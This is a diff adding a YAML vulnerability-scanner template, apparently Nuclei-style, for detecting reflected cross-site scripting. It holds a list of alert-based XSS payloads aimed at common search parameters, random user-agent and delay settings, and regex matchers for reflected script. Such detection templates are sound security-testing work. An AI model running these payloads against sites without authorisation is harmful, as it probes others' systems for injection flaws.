@@ -1,0 +1,80 @@
+id: xss-reflected
+name: Reflected XSS Detection
+author: PADOCCA Team
+severity: high
+description: Detects reflected XSS vulnerabilities with multiple payloads
+reference:
+  - https://owasp.org/www-community/attacks/xss/
+  - https://portswigger.net/web-security/cross-site-scripting
+tags:
+  - xss
+  - injection
+  - owasp-top10
+  - reflected
+
+requests:
+  - method: GET
+    path:
+      - "/?q={{payload}}"
+      - "/search?q={{payload}}"
+      - "/search?query={{payload}}"
+      - "/find?q={{payload}}"
+      - "/?s={{payload}}"
+      - "/?search={{payload}}"
+      - "/index.php?search={{payload}}"
+    
+    payloads:
+      payload:
+        - "<script>alert('XSS')</script>"
+        - "'\"><script>alert('XSS')</script>"
+        - "<img src=x onerror=alert('XSS')>"
+        - "javascript:alert('XSS')"
+        - "<svg onload=alert('XSS')>"
+        - "<body onload=alert('XSS')>"
+        - "'><script>alert(String.fromCharCode(88,83,83))</script>"
+        - "<iframe src=javascript:alert('XSS')>"
+        - "<input onfocus=alert('XSS') autofocus>"
+        - "<marquee onstart=alert('XSS')>"
+        - "<details open ontoggle=alert('XSS')>"
+        - "<audio src=x onerror=alert('XSS')>"
+    
+    attack: batteringram
+    random_user_agent: true
+    random_delay: [50, 200]
+
+matchers:
+  - type: word
+    part: body
+    words:
+      - "<script>alert('XSS')</script>"
+      - "alert('XSS')"
+      - "alert(String.fromCharCode(88,83,83))"
+      - "onerror=alert"
+      - "onload=alert"
+      - "onfocus=alert"
+    condition: or
+
+  - type: regex
+    part: body
+    regex:
+      - "<script[^>]*>alert\\([^)]*\\)</script>"
+      - "on\\w+=[\"']?alert\\([^)]*\\)"
+      - "javascript:alert\\([^)]*\\)"
+    condition: or
+
+extractors:
+  - type: regex
+    name: vulnerable_parameter
+    regex:
+      - "([?&])([^=]+)="
+    group: 2
+
+behavior_checks:
+  - type: response_diff
+    description: Check if payload is reflected differently
+    response_diff:
+      min_difference: 10.0
+      check_points:
+        - "test"
+        - "<script>test</script>"
+        - "alert('test')"
